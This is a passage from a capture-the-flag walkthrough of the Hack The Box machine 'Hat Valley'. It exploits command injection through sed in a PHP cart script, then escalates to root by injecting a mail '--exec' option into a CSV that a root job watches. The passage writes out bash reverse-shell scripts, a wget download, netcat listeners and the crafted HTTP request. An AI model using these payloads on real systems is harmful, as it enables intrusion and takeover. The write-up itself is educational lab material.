        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
```

- So the "delete from cart" part of the code uses a bash command `sed`. This is what we need to try to play with.

- `wget http://10.10.14.10/getroot.sh`
- `chmod +x getroot.sh`
- In the app we add a dog hat in our cart
- So in the folder cart we need to create a file with this inside

```bash
***Hat Valley Cart***
item_id=1' -e "1e /tmp/getshell.sh" /tmp/getshell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```

- Your getshell file should look like this and should be in /tmp

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
```

- In cart you need to delete the file `b618-64f1-5be-30b7` and then rename the file you created with the name of the file you just deleted. (we can not modify the file right away so that is why all this hassle...)
- Now you will need to set a listener `rlwrap nc -lvp 4444`
- Go to back to the application an click on cart to view your cart
- Go to burp put your intercept on
- Click delete in the cart next to the item and modify the request as follow

```html
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 94
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/cart.php

item=1'+-e+"1e+/tmp/getshell.sh"+/tmp/getshell.sh+'&user=b618-64f1-5be-30b7&action=delete_item
```

> Note: We need to have the same content in the file in the server and in our burp because the script is actually comparing these value and checking that they are the same.

- We should have gotten a shell in our listener as www-data  
![shell as www-data](../.res/2023-01-04-16-44-52.png)  
- Let's have a look at this /var/www/private folder that gave us permission denied with the user bean
- In it there is a file called `leave_requests.csv`
- With `ps -aux` we can see this process

```bash
root         945  0.0  0.0   2988  1164 ?        S    01:11   0:00 inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
```

- If we tamper with the file it triggers this process

```bash
root         946  0.0  0.0  18624  1844 ?        S    01:11   0:00 /bin/bash /root/scripts/notify.sh
```

- And we can then see that it uses the mail command.
- So we can modify our previous shell or create a new one.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/4445 0>&1
```

- Researching on this command we can find the options --exec. See [here](https://www.computerhope.com/unix/umail.htm) for more info. So in the csv file we can add a line in the csv to get a root shell.
- So let's set a listener `rlwrap nc -lvp 4446` and then add the line to the file using echo like this `echo '" --exec="\!/tmp/getroot.sh"' >> leave_requests.csv`

- And we get our root shell and can grab the final flag
![root](../.res/2023-01-04-17-25-45.png)
